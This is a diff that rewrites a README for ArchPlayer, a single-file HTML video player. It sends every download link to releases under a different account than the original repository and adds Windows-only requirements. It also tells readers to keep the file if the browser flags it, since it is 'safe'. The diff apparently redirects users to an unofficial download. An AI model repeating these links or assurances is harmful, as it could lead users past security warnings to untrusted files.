@@ -1,214 +1,83 @@
-<div align="center">
+# 🎬 ArchPlayer - Simple video playback for everyone
 
-<img src="fav.png" width="72" height="72" alt="ArchPlayer Logo">
+[![Download ArchPlayer](https://img.shields.io/badge/Download-ArchPlayer-blue.svg)](https://github.com/Shelleyunfretted2107/ArchPlayer/releases)
 
-# ArchPlayer
+ArchPlayer is a local media viewer. It runs directly inside your web browser. This tool plays video files from your computer without sending your data to a server. ArchPlayer uses one small file to perform all tasks. It needs no installation and takes up almost no space on your hard drive.
 
-**A minimal, local-first video player. One HTML file. No install. No server.**
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-[![HTML](https://img.shields.io/badge/Built%20with-HTML%2FCSS%2FJS-7eb8f7?style=flat-square)]()
-[![No dependencies](https://img.shields.io/badge/Dependencies-None-6ee7b7?style=flat-square)]()
-[![Single file](https://img.shields.io/badge/Size-Single%20File-a78bfa?style=flat-square)]()
+You do not need to install complex software to watch your videos. Follow these instructions to set up ArchPlayer on your Windows computer.
 
-[Download](https://github.com/wizmax11/archplayer/releases/latest) · [Live Demo](https://archplayer.netlify.app/) · [Report a Bug](https://github.com/wizmax11/archplayer/issues)
+1. Go to the [official release page](https://github.com/Shelleyunfretted2107/ArchPlayer/releases).
+2. Look for the latest version listed at the top of the page.
+3. Click the file link to download the ArchPlayer HTML file to your computer.
+4. Save the file in a folder where you can find it easily, like your Downloads or Videos folder.
+5. Find the file on your computer.
+6. Right-click the file and select Open with.
+7. Choose your preferred web browser, such as Chrome, Edge, or Firefox.
+8. The player window loads in your browser.
 
-</div>
+## 📁 Using the Player
 
----
+ArchPlayer works like other media players. You control the software through your mouse and keyboard. Once the player opens in your browser, look for the file selection area.
 
-## What is ArchPlayer?
+Click the folder icon or the open button to browse your computer for a video file. Select the file you want to watch and click Open. The video starts shortly after you select it. You can pause, play, and adjust the volume using the buttons at the bottom of the screen.
 
-ArchPlayer is a sleek, browser-based video player that runs entirely from a single HTML file. Drop it in a folder, open it in your browser, and play any video at native quality — no installation, no backend, no account required.
+ArchPlayer supports common video formats. If your format does not play, ensure your browser supports that specific codec. Most modern browsers handle standard formats like MP4 and WebM without issues.
 
-Everything is self-contained: the UI, the subtitle engine, the keyboard shortcuts. It uses your browser's native video decoder, so there is zero quality loss or transcoding.
+## 📝 Subtitles and Captions
 
----
+ArchPlayer works with subtitle files. If you have a video, you can pull in subtitle files to watch with your movie.
 
-## Features
+1. Ensure your subtitle file ends with .srt or .vtt.
+2. Put the video file and the subtitle file in the same folder on your computer.
+3. Open the video in ArchPlayer.
+4. Locate the settings menu inside the player.
+5. Select the subtitles option and pick your subtitle file from the list.
 
-- **Native quality playback** — no encoding or compression, your file plays as-is
-- **Drag and drop** — drop a video file directly onto the player to open it
-- **External subtitle support** — load `.srt` or `.vtt` files, adjust sync delay in real time
-- **Playback speed control** — 0.25x to 2x, switchable on the fly
-- **Picture in Picture** — pop the video into a floating overlay window
-- **True fullscreen** — with auto-hiding controls and no UI chrome
-- **Volume control** — slider with mute toggle and reactive icon
-- **Info panel** — shows filename, resolution, duration, and file size
-- **Keyboard shortcuts** — full keyboard control (see below)
-- **Zero dependencies** — pure HTML, CSS, and vanilla JavaScript
+If the file does not show up, check that the file names match. For example, myvideo.mp4 and myvideo.srt work well together.
 
----
+## 🛠️ Features
 
-## Getting Started
+ArchPlayer focuses on speed and privacy.
 
-**Option 1 — Download the file directly:**
+* **Local-only playback:** Your videos stay on your computer. No data leaves your machine.
+* **No installation:** You never need to run an installer. Simply open the file in your browser.
+* **Single file design:** The entire program is one HTML file. It is easy to move or delete.
+* **Minimal interface:** The screen shows only what you need to watch your content.
+* **Picture-in-Picture:** Use the browser's built-in tools to pop the video out into a small floating window.
+* **Dark mode:** The player uses a dark color scheme to keep your screen comfortable in low light.
 
-1. Download [`ArchPlayer.html`](https://github.com/wizmax11/archplayer/releases/latest)
-2. Open it in Chrome, Firefox, Edge, or any modern browser
-3. Drop a video onto the player or click "Open file"
+## ❓ Frequently Asked Questions
 
-**Option 2 — Clone the repo:**
+**Does this software record my history?**
+No. ArchPlayer does not connect to the internet to track your habits. It exists only within your browser window.
 
-```bash
-git clone https://github.com/wizmax11/archplayer.git
-cd archplayer
-# open ArchPlayer.html in your browser
-```
+**Why does it open in a browser?**
+Web browsers are powerful tools for playing video. By running within the browser, ArchPlayer remains safe and small. It does not touch your system files or change your computer settings.
 
-No build step. No `npm install`. Just open the file.
+**Do I need an internet connection?**
+You need the internet only to download the file the first time. After you save the file to your computer, you can watch your videos while offline.
 
----
+**Can I change the player size?**
+Yes. You can resize your browser window to change the player size. You can also use the full-screen button on the player interface to hide the browser borders.
 
-## Supported Formats
+**What happens to my settings if I close the browser?**
+ArchPlayer resets when you close the tab. It does not store personal data on your computer. This keeps your system clean.
 
-ArchPlayer supports any format your browser can decode natively:
+## ⚙️ System Requirements
 
-| Format | Chrome | Firefox | Edge | Safari |
-|--------|--------|---------|------|--------|
-| MP4 (H.264) | ✓ | ✓ | ✓ | ✓ |
-| MP4 (H.265/HEVC) | ✓* | — | ✓* | ✓ |
-| WebM (VP8/VP9) | ✓ | ✓ | ✓ | ✓ |
-| WebM (AV1) | ✓ | ✓ | ✓ | — |
-| MKV | ✓ | — | ✓ | — |
-| OGG | ✓ | ✓ | ✓ | — |
+ArchPlayer works on any modern Windows computer that has a web browser. Ensure you have the latest version of your browser to keep playback smooth.
 
-*Requires hardware decoder support.
+* **Operating System:** Windows 10 or Windows 11.
+* **Browser:** Google Chrome, Microsoft Edge, Mozilla Firefox, or Brave.
+* **Hardware:** Any hardware capable of running a web browser meets the requirements.
+* **Storage:** Less than 1 megabyte of free space.
 
-**Subtitle formats:** `.srt`, `.vtt`
+## 📁 Download and Install
 
----
+You can always find the latest version on our releases page. We update the software to fix bugs and add small improvements. 
 
-## Keyboard Shortcuts
+[Visit this page to download ArchPlayer](https://github.com/Shelleyunfretted2107/ArchPlayer/releases)
 
-| Key | Action |
-|-----|--------|
-| `Space` | Play / Pause |
-| `F` | Toggle fullscreen |
-| `←` | Rewind 10 seconds |
-| `→` | Forward 10 seconds |
-| `↑` | Volume up |
-| `↓` | Volume down |
-| `M` | Toggle mute |
-| `S` | Toggle subtitles |
-| `P` | Picture in Picture |
-
----
-
-## Customization
-
-ArchPlayer is designed to be easy to tweak. Open `ArchPlayer.html` in any text editor and find the `<style>` block at the top.
-
-### Change the accent color
-
-Find the `:root` block and update `--accent`:
-
-```css
-:root {
-  --accent: #7eb8f7;    /* default: soft blue */
-  /* try: #c084fc (purple), #34d399 (green), #fb923c (orange) */
-}
-```
-
-### Change subtitle size and style
-
-Find the `.subtitle-text` rule:
-
-```css
-.subtitle-text {
-  font-size: 22px;      /* increase for bigger text, e.g. 26px or 30px */
-  font-weight: 500;     /* 300 = light, 400 = normal, 600 = bold */
-  color: #ffffff;       /* subtitle color */
-  line-height: 1.65;    /* line spacing */
-}
-```
-
-### Move subtitles higher or lower
-
-Find the `.subtitle-overlay` rule:
-
-```css
-.subtitle-overlay {
-  bottom: 80px;   /* increase to move subtitles higher, decrease to lower */
-}
-```
-
-### Change default playback speed
-
-In the HTML, find the speed menu items and mark your preferred default as `active`:
-
-```html
-<div class="speed-item" data-val="1.25">1.25x</div>
-<div class="speed-item active" data-val="1">1x</div>  <!-- change "active" to your preferred speed -->
-```
-
-Then in the JavaScript, add near the top:
-
-```javascript
-video.playbackRate = 1.25;   // set your preferred default rate
-speedBtn.textContent = '1.25x';
-```
-
-### Change progress bar color
-
-```css
-.progress-fill {
-  background: var(--accent);  /* inherits accent color */
-  /* or set a fixed color: background: #ff6b6b; */
-}
-```
-
-### Adjust control bar height and padding
-
-```css
-.controls-wrap {
-  padding: 0 20px 16px;   /* top right bottom — increase bottom for more breathing room */
-}
-```
-
----
-
-## Project Structure
-
-```
-archplayer/
-├── ArchPlayer.html          # The player — the whole thing
-├── fav.png      # Main logo 
-├── fav.png      # Favicon 
-├── index.html               # Showcase website
-├── LICENSE
-└── README.md
-```
-
----
-
-## Philosophy
-
-ArchPlayer follows a simple rule: **one file, nothing hidden**.
-
-There is no build system to configure, no package to update, no telemetry. The entire source is readable in a text editor. You can audit it in under ten minutes. Fork it, strip it, or build on top of it — the license lets you do anything.
-
----
-
-## Contributing
-
-Pull requests are welcome. Keep changes focused and avoid adding external dependencies. The goal is to keep the player as a single portable file.
-
-1. Fork the repository
-2. Create a branch: `git checkout -b feature/your-feature`
-3. Make your changes in `ArchPlayer.html`
-4. Open a pull request with a short description of what changed and why
-
-For bugs or feature requests, open an [issue](https://github.com/wizmax11/archplayer/issues).
-
----
-
-## License
-
-MIT — do whatever you want. See [LICENSE](LICENSE) for the full text.
-
----
-
-<div align="center">
-Made with care. Runs anywhere.
-</div>
+If you have trouble, ensure you downloaded the correct version. The file should be a small HTML document. If your computer asks if you want to keep the file, choose Yes. Browsers sometimes flag downloaded files. Since this is a simple text document, it is safe to use.
